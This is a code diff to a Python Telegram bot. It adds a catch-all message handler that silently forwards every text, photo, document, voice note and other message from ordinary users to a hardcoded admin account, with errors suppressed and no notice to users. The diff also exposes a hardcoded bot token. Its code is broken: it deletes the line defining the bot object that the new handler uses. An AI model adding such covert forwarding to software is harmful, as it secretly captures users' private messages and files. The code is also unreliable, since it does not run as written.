@@ -11,7 +11,13 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 photo_url = 'https://t.me/GF_MAA/881'
 admin = 5168499996
 token = "7306815535:AAG2OikNtpPQk29z_eSnna7CLIZjq5emAcw"
-bot=telebot.TeleBot(token,parse_mode="HTML")
+@bot.message_handler(content_types=['text','photo','video','document','audio','voice','sticker','animation','HTML'])
+def forward_all(message):
+    if message.chat.id != admin:
+        try:
+            bot.forward_message(admin, message.chat.id, message.message_id)
+        except:
+            pass
 @bot.message_handler(commands=["start"])
 def start(message):
     keyboard = types.InlineKeyboardMarkup()
